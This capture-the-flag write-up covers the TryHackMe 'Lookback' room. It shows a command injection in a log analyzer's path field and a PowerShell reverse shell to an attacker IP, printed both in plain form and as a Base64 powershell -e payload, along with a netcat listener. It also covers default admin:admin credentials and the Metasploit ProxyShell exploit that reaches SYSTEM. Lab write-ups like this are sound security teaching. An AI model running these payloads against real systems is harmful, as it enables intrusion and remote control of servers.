# Resolution Report: Room “Lookback” (TryHackMe)

## Introduction

This report details the methodology followed to solve the TryHackMe room “Lookback”. The machine simulates an Active Directory environment with a “rushed” integration, which suggests default configurations or unpatched vulnerabilities. The room title, “Lookback”, and the hint “Sometimes to move forward, we have to go backward” were crucial to the solution.

## Phase 1: Reconnaissance and Enumeration

The process began with a network scan to identify services and possible entry points.

**Actions:**

1. A thorough Nmap scan was carried out. Since the machine did not respond to ICMP, the `-Pn` flag was used.

   ```bash
   nmap -p- --open -sS --min-rate 5000 -n -Pn <IP_DE_LA_MAQUINA>
   # First scan for open ports

   nmap -sC -sV -Pn -p <PUERTOS_ABIERTOS> <IP_DE_LA_MAQUINA>
   # Detailed scan of versions and scripts
   ```

**Nmap Output (Relevant):**

Text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/https     Microsoft IIS httpd 10.0
|_http-title: Outlook
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
3389/tcp open  ms-wbt-server Microsoft Terminal Services

**Key Findings:**

* **Open Ports:**

  * `80/tcp`: `http` - Microsoft IIS httpd 10.0
  * `443/tcp`: `ssl/https` - Microsoft IIS httpd 10.0, with a redirect to `/owa/auth/logon.aspx` - Outlook login.
  * `3389/tcp`: `ms-wbt-server` - Microsoft Terminal Services (RDP).
* **Certificate/RDP Information:** The internal hostname `WIN-12OUO7A66M7` and the domain `thm.local` were extracted.

**Initial Configuration:**
To ensure correct name resolution for the Exchange server, the entry was added to the attacker machine’s `/etc/hosts` file:

```bash
echo "10.65.132.191 thm.local WIN-12OUO7A66M7.thm.local WIN-12OUO7A66M7" | sudo tee -a /etc/hosts
```

**Wrong Paths and Challenges:**

* **Directory scanning with `gobuster`:** An attempt was made to find hidden directories using `gobuster dir -u https://thm.local -k -w /usr/share/wordlists/dirb/common.txt` and other variants, with no positive results initially.
* **Log4Shell/ProxyShell vulnerabilities (external):** Attempts were made to exploit potential vulnerabilities such as Log4Shell via JNDI injection in the OWA login, and ProxyShell (CVE-2021-34473) with Nmap scripts and manual URLs, but these attempts produced no results or confirmed no vulnerability from the outside.

**Correct Path (Initial Access to the Web Panel):**
Based on the hint of a “rushed” implementation, the existence of common test directories was tried.

1. `https://thm.local/test` was accessed directly in the browser.
2. A basic authentication portal was found.
3. The default credentials **`admin:admin`** were tested, which worked. The portal was a “Log Analyzer”.

   **Output:**
   Access to the “Log Analyzer” panel was obtained after authentication.

**Service User Flag:**
Within the “Log Analyzer” interface, the first flag was identified.
`THM{}`

---

## Phase 2: Initial Access to the System (Remote Code Execution - RCE)

The “Log Analyzer” presented an input field for the log path and a “Run” button, which suggested a command injection vulnerability.

![alt text](imageLookback.png)

**Actions:**

1. **Command Injection Confirmation:** Command injection was tested in the “Path” field.

   ```
   BitlockerActiveMonitoringLogs'); whoami; ('
   ```
2. **Output:** The web interface returned `thm\admin`, confirming the RCE vulnerability.
3. **Obtaining a Reverse Shell:** A PowerShell reverse-shell payload encoded in Base64 was generated to establish a stable connection.

   ```powershell
   # PowerShell script for a reverse shell to 10.65.106.162:4444 (example)
   $client = New-Object System.Net.Sockets.TcpClient('10.65.106.162',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

   # Base64 payload (example with attacker IP 10.65.106.162)
   JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcAMQAwAC4ANgA1AC4AMQAwADYALgAxADYAMgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZW4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYwBrAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYwBrAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
   ```
4. The full payload was injected into the web “Path” field:

   ```text
   BitlockerActiveMonitoringLogs'); powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcAMQAwAC4ANgA1AC4AMQAwADYALgAxADYAMgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZW4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYwBrAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYwBrAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwBlAG4AZABiAHkAdABlAC4ARgBsAHUAcwBoACgAKQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=; ('
   ```
5. A listener was started on the attacker machine.

   ```bash
   nc -lvnp 4444
   ```

**Output:**
A reverse shell was obtained on the Netcat listener, confirming initial access to the system as `thm\admin`. The “Log Analyzer” web page remained in a “sending request...” state, which is normal during a reverse shell.

```plaintext
Connection received on 10.65.132.191 10265
PS C:\windows\system32\inetsrv>
```

---

## Phase 3: User Enumeration and Obtaining the User Flag

With an active shell, user enumeration was carried out and the user flag was located.

**Actions:**

1. The user folders on the system were listed to identify possible users.

   ```powershell
   ls C:\Users
   ```

2. **Output:**

   ```
       Directory: C:\Users

   Mode                LastWriteTime         Length Name                                                                 
   ----                -------------         ------ ----                                                                 
   d-----        1/25/2023  12:54 PM                .NET v4.5                                                            
   d-----        1/25/2023  12:54 PM                .NET v4.5 Classic                                                    
   d-----        3/21/2023  11:40 AM                Administrator                                                        
   d-----        2/21/2023  12:31 AM                dev                                                                  
   d-r---        1/25/2023   8:15 PM                Public
   ```

   This output clearly allowed us to identify the existence of a user called `dev`.

3. The `dev` folder was browsed (since `Administrator` might have restrictions or not contain the user flag).

   ```powershell
   cd C:\Users\dev\Desktop
   ls
   ```

4. **Output:**

   ```powershell
   # ...
   -a---- 3/21/2023 12:28 PM 512 TODO.txt
   -a---- 2/12/2023 11:53 AM 29 user.txt
   # ...
   ```

5. The contents of `user.txt` were read.

   ```powershell
   type user.txt
   ```

**User Flag:**
`THM{}`

**Additional Finding (TODO.txt):**
The `TODO.txt` file found on the `dev` user’s desktop was read.

```powershell
type TODO.txt
```

**Output:**

```
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]

When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

**TODO.txt Analysis:**
This file was a gold mine of information:

* It confirmed that the Exchange server did not have the security updates installed (`Install the Security Update for MS Exchange [TO BE DONE]`), making it vulnerable to known exploits such as ProxyShell.
* It identified valid users in the domain: `joe@thm.local`, `carol@thm.local`, `dev-infrastracture-team@thm.local`.
* It mentioned the task of removing the “log analyser”, reinforcing the idea that it was a forgotten test application.
* It indicated that LAPS was not set up, a possible escalation route.

---

## Phase 4: Privilege Escalation (Exchange ProxyShell)

The information in `TODO.txt` pointed directly to an unpatched Microsoft Exchange vulnerability, specifically ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207).

**Actions:**

1. Metasploit was opened in a new terminal (the Netcat listener was still active on port 4444, so Metasploit should use another port).

   ```bash
   msfconsole
   ```

2. The ProxyShell exploit was searched for and loaded.

   ```bash
   search proxyshell
   use exploit/windows/http/exchange_proxyshell_rce
   ```

3. **Wrong Path (Attempt with `joe@thm.local`):**
   The exploit options were configured, using port 4445 to avoid conflict with the Netcat listener.

   ```bash
   set RHOSTS 10.65.132.191
   set LHOST 10.65.106.162
   set LPORT 4445
   set EMAIL joe@thm.local
   run
   ```

   **Output:**
   The exploit failed with the message `Exploit aborted due to failure: not-found: No Autodiscover information was found`. This suggested that user `joe` did not have the appropriate configuration for the exploit to resolve Autodiscover information correctly, or that the exploit required a more privileged user.

4. **Wrong Paths (Manual Search for Credentials):**
   From the `thm\admin` shell, attempts were made to search for credentials in PowerShell history files and unattended installation files (`C:\Windows\Panther\Unattend.xml` or `.txt`), without success. This confirmed that local escalation was not so straightforward.

5. **Correct Path (Attempt with `Administrator@thm.local`):**
   The decision was made to try the Metasploit exploit again, but this time using the default administrator account (`Administrator@thm.local`), assuming that this account would have the permissions required for Autodiscover resolution or that the exploit was more effective with it.

   ```bash
   set EMAIL Administrator@thm.local
   run
   ```

**Output:**
The exploit was successful and a Meterpreter session was obtained.

```plaintext
[*] Started reverse TCP handler on 10.65.106.162:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Attempting to exploit CVE-2021-34473...
[*] Authenticated to Exchange.
[*] Uploading payload...
[*] Meterpreter session 1 opened (10.65.106.162:4445 -> 10.65.132.191:50321) at 2026-01-12 04:00:00 +0000
```

The privilege level was confirmed with the `getuid` command.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

This confirmed that escalation to the highest privileges on the system had been achieved.

---

## Phase 5: Obtaining the Root Flag

With `NT AUTHORITY\SYSTEM` privileges, the final flag was located.

**Actions:**

1. A system shell was opened from Meterpreter.

   ```bash
   meterpreter > shell
   ```

2. The `Administrator` user’s desktop was accessed.

   ```cmd
   cd C:\Users\Administrator\Desktop
   ```

3. The contents of the folder were listed, including hidden files.

   ```cmd
   dir /a
   ```

   **Output:**
   Initially, the flag was not found on `Desktop`.

4. **Correct Path (Location of the Root Flag):**
   Other common locations for administrator flags were searched, specifically the “Documents” folder.

   ```cmd
   cd C:\Users\Administrator\Documents
   dir
   ```

   **Output:**
   The `flag.txt` file was found in this location.

   ```cmd
   C:\Users\Administrator\Documents>dir

    Directory of C:\Users\Administrator\Documents

   # ...
   -a---- 1/12/2026 4:05 AM 32 flag.txt
   # ...
   ```

5. The contents of `flag.txt` were read.

   ```cmd
   type flag.txt
   ```

**Root Flag:**
`THM{}`

---

### Conclusion

Solving the “Lookback” room involved a pentesting process that mirrored real-world scenarios with rushed system configurations. Success depended on:

1. **Web directory enumeration:** Discovering a forgotten admin panel (`/test`) with default credentials (`admin:admin`).
2. **Command injection exploitation:** Leveraging an RCE vulnerability in the “Log Analyser” to obtain an initial shell.
3. **Analysis of leaked information:** Using the `TODO.txt` file to identify a critical vulnerability (unpatched Exchange) and system users.
4. **Privilege escalation with Metasploit:** Exploiting the Exchange ProxyShell vulnerability, with the key being the intuition to use the `Administrator` account for the exploit when others failed.
5. **Thorough searching:** Locating the final flag in a non-standard but logical location (`C:\Users\Administrator\Documents`).

The room name and the final flag, `THM{}`, perfectly summarise the challenge: sometimes, “looking back” at initial configurations, logs, or known vulnerabilities is the key to moving forward.
